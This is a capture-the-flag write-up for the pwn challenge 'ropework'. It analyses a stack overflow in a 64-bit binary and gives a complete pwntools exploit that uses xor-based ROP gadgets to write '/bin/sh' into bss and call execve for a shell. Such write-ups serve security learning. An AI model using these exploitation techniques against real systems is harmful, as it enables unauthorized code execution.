# ropework

Author: [d1g174l_f0rtr355](https://twitter.com/BhaskaraShravya)

Solves: 9

Difficulty: Medium

## Preliminary Analysis:

We notice that the binary is a 64-bit non-stripped binary with the folloeing protections:
```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```
## Understanding the challenge:

The binary itself is very simple:
```
  char s[16]; // [rsp+0h] [rbp-10h] BYREF

  setvbuf(_bss_start, 0LL, 2, 0LL);
  system("echo 'The fisherman is trying to untangle his fishing knots. If you could help him with it, it would be great!\n'");
  fgets(s, 329, stdin);
  system("echo 'Ok bye!\n'");
  return 0;
```

Since there is no other function to return to and with PIE being disabled, we can begin our exploitation by creating a suitable ROP chain. There could be other ways pf creating the ROP chain with the available gadgets. I would be showing one of those methods.

## Exploitation:

The ROP chain is made up of the following instructions:

```
pop_rdi = 0x0000000000401273# pop rdi ; ret
pop_rsi = 0x0000000000401271# pop rsi ; pop r15 ; ret
pop_r12 = 0x000000000040126c# pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret

xor_rax_rax = 0x0000000000401182# 
xor_rax_rbx = 0x0000000000401186
xor_rbx_rbx = 0x000000000040118a
xor_rdx_rbx = 0x000000000040118e
xor_rdx_rdx = 0x0000000000401192

mov_rbx_r10 = 0x000000000040117e
movq_rdx_r10 = 0x000000000040119e# mov qword ptr [rdx], r10 ; ret

xor_r10_r10 = 0x0000000000401196
xor_r10_r12 = 0x000000000040119a

ret = 0x0000000000401205
syscall = 0x00000000004011a2
```

Upon xorring two same registers, the registers get nulled out. We can transfer the contents of a register to another using xor with the help of a similar technique. Since anything xorred with 0 is the number itself, we make use of this concept to eventually place the string "/bin/sh" into a bss address. We then pop the address into register `rdi`. We also set `rax` to contain `0x3b` and null out registers `rsi` and `rdx` before making the syscall.

## Exploit:

```
from pwn import *

p = process('./ropework')
#gdb.attach(p, gdbscript='set follow-fork-mode parent\n')
#p = remote('localhost', 4008)
p.recvline()

'''
gadgets
'''
pop_rdi = 0x0000000000401273
pop_rsi = 0x0000000000401271
pop_r12 = 0x000000000040126c

xor_rax_rax = 0x0000000000401182
xor_rax_rbx = 0x0000000000401186
xor_rbx_rbx = 0x000000000040118a
xor_rdx_rbx = 0x000000000040118e
xor_rdx_rdx = 0x0000000000401192

mov_rbx_r10 = 0x000000000040117e
movq_rdx_r10 = 0x000000000040119e

xor_r10_r10 = 0x0000000000401196
xor_r10_r12 = 0x000000000040119a

ret = 0x0000000000401205
syscall = 0x00000000004011a2

bss = 0x404030

pay = 'a'*0x10
pay += 'b'*0x8
pay += p64(ret)# leave_ret

pay += p64(pop_r12)
pay += p64(bss)
pay += p64(0x0)
pay += p64(0x0)
pay += p64(0x0)

pay += p64(xor_r10_r10)
pay += p64(xor_r10_r12)

pay += p64(xor_rbx_rbx)
pay += p64(mov_rbx_r10)

pay += p64(xor_rdx_rdx)
pay += p64(xor_rdx_rbx)

pay += p64(pop_r12)
pay += p64(u64("/bin/sh\x00"))
pay += p64(0x0)
pay += p64(0x0)
pay += p64(0x0)

pay += p64(xor_r10_r10)
pay += p64(xor_r10_r12)

pay += p64(movq_rdx_r10)

pay += p64(pop_rdi)
pay += p64(bss)

pay += p64(pop_r12)
pay += p64(0x3b)
pay += p64(0x0)
pay += p64(0x0)
pay += p64(0x0)

pay += p64(xor_r10_r10)
pay += p64(xor_r10_r12)

pay += p64(xor_rbx_rbx)
pay += p64(mov_rbx_r10)
pay += p64(xor_rax_rax)
pay += p64(xor_rax_rbx)

pay += p64(xor_rdx_rdx)

pay += p64(pop_rsi)
pay += p64(0x0)
pay += p64(0x0)

#pay += p64(xor_rbx_rbx)

pay += p64(syscall)
#pay += p64(ret)

print(len(pay))
p.sendline(pay)
p.interactive()

```

